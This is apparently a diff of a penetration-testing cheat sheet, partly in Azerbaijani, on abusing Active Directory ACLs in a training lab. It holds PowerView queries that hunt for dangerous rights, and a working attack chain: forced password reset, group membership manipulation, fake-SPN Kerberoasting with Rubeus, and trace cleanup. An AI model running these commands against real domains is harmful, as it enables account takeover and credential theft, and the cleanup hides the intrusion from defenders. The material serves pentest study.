@@ -1,87 +1,194 @@
 # Access Control List Abuse
 <img width="975" height="452" alt="image" src="https://github.com/user-attachments/assets/17d9ea44-b8ff-4610-928d-b7f608798107" />
 
-## Access Control List Command
+## PowerView Import
 ```
 Import-Module .\PowerView.ps1
 Get-Module ActiveDirectory
+```
 
+## All domain Enumeration
+```
 # Bütün domain obyektlərinin ACL xəritəsi
 Get-DomainObjectAcl -ResolveGUIDs | Select ObjectDN,ActiveDirectoryRights,IdentityReference
 
 # Riskli Hüquqlar
 Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner|Owner|DeleteChild" } | ft ObjectDN,ActiveDirectoryRights,IdentityReference -AutoSize
+```
 
-# User ACL-ləri
+## Bütün Userlərin müəyyən User üzərindəki ACL-ləri
+```
 Get-ObjectAcl -Identity <USER> -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|GenericWrite" } ( Single User )
 
-Get-DomainUser | ForEach-Object {
-    Get-ObjectAcl -Identity $_.SamAccountName -ResolveGUIDs
-} | ? {
-    $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|GenericWrite"
-} | 
-Select ObjectDN,ActiveDirectoryRights,IdentityReference ( All Users )
+## Bütün Userlərin digər userlər üzərindəki ACL-ləri
+Get-DomainUser | ForEach-Object { Get-ObjectAcl -Identity $_.SamAccountName -ResolveGUIDs } | ? {
+    ($_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|GenericWrite") -and
+    ($_.IdentityReference -notmatch "Domain Admins|Enterprise Admins|SYSTEM|Admins")
+} | Select ObjectDN, ActiveDirectoryRights, IdentityReference
+```
 
-# Group ACL-ləri
+## Bir qrupun ACL-ləri
+```
 Get-ObjectAcl -Identity "<GROUP NAME>" -ResolveGUIDs
+```
 
+## Bir Userin bütün qruplar üzrə ACL-ləri
+```
+$userSID = (Get-DomainUser -Identity "<USER>").userPrincipalName
+Get-DomainGroup | ForEach-Object {
+    $groupName = $_.Name
+    Get-ObjectAcl -Identity $_.DistinguishedName -ResolveGUIDs | ? {
+        ($_.IdentityReference -match $userSID) -and
+        ($_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|GenericWrite|AddMember")
+    } | Select-Object @{Name="ModifiableGroup";Expression={$groupName}}, 
+        ActiveDirectoryRights
+}
+```
+
+## Bir userin müəyyən qrup üzərində hansı hüquqları var
+```
 Get-ObjectAcl -Identity "Help Desk Level 1" -ResolveGUIDs |
-? { $_.IdentityReference -match "damundsen" } 
+? { $_.IdentityReference -match "damundsen" }
+```
 
-# User-Force-Change-Password ExtendedRight
+## Search Extended Right ( User-Force-Change-Password )
+```
 Get-ADObject `
 -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" `
 -LDAPFilter "(name=*Force*)" `
 -Properties rightsGuid |
 Select Name,DisplayName,RightsGuid
+```
 
-# Computer ACL-ləri
-Get-ObjectAcl -Identity <COMPUTERNAME>$ -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "GenericAll|GenericWrite" }
+## Spesifik kompüter və ya bütün kompüterlərdəki riskli ACL-ləri tapmaq
+```
+Get-DomainComputer | ForEach-Object {
+    $computerName = $_.Name
+    Get-ObjectAcl -Identity $_.DistinguishedName -ResolveGUIDs | ? {
+        ($_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner") -and
+        ($_.IdentityReference -notmatch "Domain Admins|Enterprise Admins|SYSTEM")
+    } | Select-Object @{Name="TargetComputer";Expression={$computerName}}, 
+        IdentityReference, 
+        ActiveDirectoryRights
+} | ft -AutoSize
+```
 
-# OU ACL-ləri (Child Creation Abuse)
-Get-DomainOU | Get-ObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild" }
+## OU üzərində obyekt yaratma və ya GPO manipulyasiya hüquqlarını tapmaq
+```
+Get-DomainOU | ForEach-Object {
+    $ouName = $_.Name
+    Get-ObjectAcl -Identity $_.DistinguishedName -ResolveGUIDs | ? {
+        ($_.ActiveDirectoryRights -match "CreateChild|WriteDacl|WriteProperty") -and
+        ($_.IdentityReference -notmatch "Domain Admins|SYSTEM")
+    } | Select-Object @{Name="TargetOU";Expression={$ouName}}, 
+        IdentityReference, 
+        ActiveDirectoryRights,
+        @{Name="AccessType";Expression={if($_.ActiveDirectoryRights -match "CreateChild"){"Object Creation"}else{"Possible GPO Link Abuse"}}}
+```
 
 # Domain Root ACL
-Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectDN -match "^DC=" }
+```
+Get-DomainObjectAcl -ResolveGUIDs | ? {
+    ($_.ObjectDN -match "^DC=") -and
+    ($_.ActiveDirectoryRights -match "ExtendedRight") -and
+    ($_.ObjectAceType -match "DS-Replication-Get-Changes|DS-Replication-Get-Changes-All")
+} | Select-Object IdentityReference, ObjectAceType, ActiveDirectoryRights
 
-# SID-Based Targeted Hunt
-$sid = Convert-NameToSid username
+Get-DomainObjectAcl -ResolveGUIDs | ? {
+    ($_.ObjectDN -match "^DC=") -and
+    ($_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|All") -and
+    ($_.IdentityReference -notmatch "Admins|SYSTEM|Enterprise Admins")
+} | Select-Object ObjectDN, IdentityReference, ActiveDirectoryRights
 
-Get-DomainObjectACL -ResolveGUIDs -Identity * |
-? { $_.SecurityIdentifier -eq $sid }
+Get-DomainObjectAcl -ResolveGUIDs | ? { ($_.ObjectDN -match "^DC=") -and ($_.ActiveDirectoryRights -match "WriteOwner") } |
+Select-Object ObjectDN, IdentityReference, ActiveDirectoryRights
+```
 
-# Bir userin ( USER1 ) digər userlər üzərindəki ACL ləri
-Get-DomainObjectACL -ResolveGUIDs | ? { $_.SecurityIdentifier -eq (Get-DomainUser -Identity <USER1> -Properties objectsid).objectsid } | ? { $_.ObjectType -eq "User" -or $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl" } | Select-Object ObjectDN, ActiveDirectoryRights, ObjectAceType
+## SID-Based Targeted Hunt
+```
+$sid = (Get-DomainUser -Identity "username").objectsid
 
-# Bir Userin ( USER1 ) digər User ( USER2 ) üzərindəki ACL ləri
-$SID = (Get-DomainUser -Identity <USER1>).objectsid
-Get-DomainObjectACL -Identity <USER2> -ResolveGUIDs | ? { $_.SecurityIdentifier -eq $SID }
+# Bütün domaində bu SID-ə aid olan hüquqları birbaşa tapmaq
+Get-DomainObjectAcl -ResolveGUIDs -PrincipalSID $sid | 
+Select-Object ObjectDN, ActiveDirectoryRights, ObjectAceType
+```
 
-$UserGroupsSIDs = Get-DomainGroup -MemberIdentity <USER1> | Select-Object -ExpandProperty objectsid
-$UserSID = (Get-DomainUser -Identity <USER1>).objectsid
-$AllSIDs = $UserGroupsSIDs + $UserSID
-Get-DomainObjectACL -Identity adunn -ResolveGUIDs | ? { $AllSIDs -contains $_.SecurityIdentifier } | Select-Object ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType
+## Bir userin ( USER1 ) digər userlər üzərindəki ACL ləri
+```
+$User1SID = (Get-DomainUser -Identity "USER1").objectsid
 
-# Digər userlərin müəyyən bir user <USER1> üzərindəki ACL ləri
-Get-DomainObjectACL -Identity <USER1> -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl|GenericWrite|AllExtendedRights" } | Select-Object SecurityIdentifier, ActiveDirectoryRights, ObjectAceType
+Get-DomainUser | ForEach-Object {
+    Get-DomainObjectAcl -Identity $_.DistinguishedName -PrincipalSID $User1SID -ResolveGUIDs
+} | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl|WriteOwner|All" } | 
+Select-Object ObjectDN, ActiveDirectoryRights, @{Name="TargetType";Expression={"User"}}
+```
 
-"SID1", "SID2" | ConvertFrom-SID
+## Bir Userin ( USER1 ) digər User ( USER2 ) üzərindəki ACL ləri
+```
+$User1SID = (Get-DomainUser -Identity "USER1").objectsid
 
-Get-DomainGroupMember -Identity "<GROUP_NAME>" | Select-Object MemberName
+Get-DomainObjectAcl -Identity "USER2" -ResolveGUIDs | 
+? { $_.SecurityIdentifier -eq $User1SID } | 
+Select-Object ObjectDN, ActiveDirectoryRights, ObjectAceType
+```
 
-# Extended Rights Manual Analysis
-$guid= "00299570-246d-11d0-a768-00aa006e0529"
+## Compromise ACL
+```
+$targetUser = "USER1"
+$userObj = Get-DomainUser -Identity $targetUser
+$UserSID = $userObj.objectsid
 
-Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" `
--Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |
-Select Name,DisplayName,DistinguishedName,rightsGuid |
-? { $_.rightsGuid -eq $guid }
+# İstifadəçinin həm öz SID-ini, həm də daxil olduğu bütün qrupların SID-lərini toplayırıq
+$allSIDs = Get-DomainGroup -MemberIdentity $targetUser | Select-Object -ExpandProperty objectsid
+$allSIDs += $UserSID
+
+# Hədəf istifadəçi (adunn) üzərində bu SID-lərdən hər hansı birinin hüququ varmı?
+Get-DomainObjectAcl -Identity "adunn" -ResolveGUIDs | 
+? { $allSIDs -contains $_.SecurityIdentifier } | 
+Select-Object @{Name="Grantor";Expression={$targetUser}}, ObjectDN, ActiveDirectoryRights, SecurityIdentifier
+```
+
+## Digər Userlərin Müəyyən Bir User (<USER1>) Üzərindəki ACL-ləri
+```
+Get-DomainObjectAcl -Identity "<USER1>" -ResolveGUIDs | ? { 
+    $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl|GenericWrite|AllExtendedRights" -and
+    $_.IdentityReference -notmatch "Domain Admins|Enterprise Admins|SYSTEM"
+} | Select-Object IdentityReference, ActiveDirectoryRights, ObjectAceType, IsInherited | ft -AutoSize
+```
+## SID Convert
+```
+"S-1-5-21-...", "S-1-5-21-..." | ForEach-Object { 
+    ConvertFrom-SID $_ | Select-Object @{N="SID";E={$_}}, @{N="Name";E={(Get-DomainObject -Identity $_).Name}}
+}
+```
+
+## Qrup Üzvlərinin Sürətli Analizi
+```
+Get-DomainGroupMember -Identity "Help Desk Level 1" | Select-Object MemberName, MemberDistinguishedName, MemberObjectClass
+```
+
+## Extended Rights Manual Analysis (GUID Mapping)
+```
+function Get-ExtendedRightName {
+    param($guid)
+    Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" `
+    -Filter "rightsGuid -eq '$guid'" -Properties DisplayName | Select-Object -ExpandProperty DisplayName
+}
+
+# İstifadəsi:
+Get-ExtendedRightName -guid "00299570-246d-11d0-a768-00aa006e0529"
+```
 
 # Group → MemberOf Chain Analysis
-Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
+```
+Get-DomainGroup -Identity "Help Desk Level 1" | Get-DomainGroupMemberOf -Flatten | Select-Object Name, DistinguishedName
+```
 
 # Auto Discovery
-Find-InterestingDomainAcl
+```
+Find-InterestingDomainAcl -ResolveGUIDs | ? { 
+    $_.IdentityReference -notmatch "Admins|SYSTEM|Exchange" 
+} | Select-Object ObjectDN, IdentityReference, ActiveDirectoryRights | Out-GridView
 ```
 
 ## SharpHound
@@ -123,55 +230,72 @@ grep -r "GenericAll\|WriteDacl" /tmp/ldapdump/
 ```
 
 # ACL Abuse Tactics
+
+## Hədəf Axtarışı (Recon & Enumeration)
 ```
-# Creating a PSCredential Object
-$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
+$CurrentSID = (Get-DomainUser -Identity $env:USERNAME).objectsid
 
-# Creating a SecureString Object
-$<USER>Password = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+Get-DomainObjectACL -ResolveGUIDs | ? {
+    ($_.SecurityIdentifier -eq $CurrentSID) -and 
+    ($_.ActiveDirectoryRights -match 'GenericAll' -or $_.ObjectAceType -match 'User-Force-Change-Password')
+} | Select-Object ObjectDN, ActiveDirectoryRights, ObjectAceType | Out-GridView
+```
 
-# Changing the User's Password
-Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
+## Parolun Sıfırlanması (The Abuse)
+```
+# 1. Addım: Yeni parolu SecureString formatına salmaq
+$NewPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
 
-# Creating a SecureString Object using damundsen
-$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
-$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
+# 2. Addım: Parolu sıfırlamaq (Set-DomainUserPassword PowerView funksiyasıdır)
+Set-DomainUserPassword -Identity damundsen -AccountPassword $NewPassword -Verbose
 
-# Adding damundsen to the Help Desk Level 1 Group
-Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
-Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
+# 3. Addım: Yeni giriş məlumatları (Credential) obyekti yaratmaq
+$damundsenCred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $NewPassword)
+```
 
-# Confirming damundsen was Added to the Group
-Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
+<img width="894" height="464" alt="Screenshot 2026-03-07 163209" src="https://github.com/user-attachments/assets/098da167-3eb9-4148-9e00-24f1ba0906f6" />
 
-# Creating a Fake SPN
-Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+## Qrup Manipulyasiyası (Lateral Movement)
+```
+# Qrupa üzv əlavə etmək (damundsen-in hüququndan istifadə edərək)
+Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $damundsenCred -Verbose
 
-# Kerberoasting with Rubeus
+# Üzvliyi yoxlamaq
+Get-DomainGroupMember -Identity "Help Desk Level 1" | Select-Object MemberName | ? {$_.MemberName -match 'damundsen'}
+```
+
+## SPN Manipulyasiyası və Kerberoasting (Stealth Attack)
+```
+# 1. Addım: Saxta SPN təyin etmək
+Set-DomainObject -Credential $damundsenCred -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+
+# 2. Addım: Rubeus ilə heşi çəkmək
 .\Rubeus.exe kerberoast /user:adunn /nowrap
 
-# Removing the Fake SPN from adunn's Account
-Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
-
-# Removing damundsen from the Help Desk Level 1 Group
-Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
-Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
+# 3. Addım: İzi itirmək üçün SPN-i silmək (Vacibdir!)
+Set-DomainObject -Credential $damundsenCred -Identity adunn -Clear serviceprincipalname -Verbose
 ```
 
-# Change Password ACL
+## Təmizlik və İzlərin Silinməsi (Cleanup)
 ```
-Get-DomainObjectACL -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'GenericAll' -or $_.ObjectAceType -match 'User-Force-Change-Password'} | ? {$_.SecurityIdentifier -match (Get-DomainUser -Identity $env:USERNAME -Properties objectsid).objectsid}
+# Qrupdan çıxarılma
+Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $damundsenCred -Verbose
 
-Get-DomainObjectACL -ResolveGUIDs | ? {$_.ObjectAceType -match 'User-Force-Change-Password'} | Select-Object ObjectDN, SecurityIdentifier | Out-GridView
+# Təsdiqləmə
+Get-DomainGroupMember -Identity "Help Desk Level 1" | Select-Object MemberName
 ```
-<img width="894" height="464" alt="Screenshot 2026-03-07 163209" src="https://github.com/user-attachments/assets/098da167-3eb9-4148-9e00-24f1ba0906f6" />
-```
-Get-DomainUser -Properties samaccountname, objectsid | ? {$_.objectsid -like '*-<RID>'}
-Get-DomainGroup -Properties samaccountname, objectsid | ? {$_.objectsid -like '*-<RID>'}
-Get-DomainComputer -Properties samaccountname, objectsid | ? {$_.objectsid -like '*-<RID>'}
 
-Get-DomainGroupMember -Identity "<samaccountname>" | Select-Object MemberName
+## SID-dən Obyektə (Sürətli Axtarış)
+```
+function Get-ObjectByRID {
+    param($RID)
+    Get-DomainObject -Properties samaccountname, objectsid | ? {$_.objectsid -like "*-$RID"}
+}
+
+# İstifadəsi:
+Get-ObjectByRID -RID 1105
+```
+
 
 
 
